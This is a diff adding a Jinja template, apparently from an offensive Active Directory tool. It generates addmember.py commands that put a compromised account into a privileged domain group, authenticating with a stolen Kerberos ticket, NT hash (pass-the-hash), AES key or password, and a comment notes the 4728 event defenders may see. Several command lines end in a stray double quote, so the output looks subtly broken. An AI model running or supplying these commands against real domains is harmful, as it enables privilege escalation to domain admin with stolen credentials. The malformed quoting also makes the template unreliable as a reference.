@@ -1,0 +1,14 @@
+# Add {{parent.obj.name}} in the group {{target.name}}
+# This action will generate a 4728 event on the domain controller that handled
+# the request. This event may be centrally collected and analyzed by security
+# analysts, especially for groups that are obviously very high privilege groups
+# (i.e.: Domain Admins).
+{% if parent.krb_auth %}
+./tools/addmember.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -use-ldaps -dc-ip {{dc_ip}} -k -t '{{target.name}}' -add '{{parent.obj.dn}}'"
+{%- elif parent.secret_type == T_SECRET_NTHASH %}
+./tools/addmember.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -use-ldaps -dc-ip {{dc_ip}} -hashes :{{parent.secret|red}} -t '{{target.name}}' -add '{{parent.obj.dn}}'"
+{%- elif parent.secret_type == T_SECRET_AESKEY %}
+./tools/addmember.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -use-ldaps -dc-ip {{dc_ip}} -k -aesKey {{parent.secret|red}} -t '{{target.name}}' -add '{{parent.obj.dn}}'"
+{%- elif parent.secret_type == T_SECRET_PASSWORD %}
+./tools/addmember.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}@{{dc_name}}' -use-ldaps -dc-ip {{dc_ip}} -k -t '{{target.name}}' -add '{{parent.obj.dn}}'
+{%- endif %}
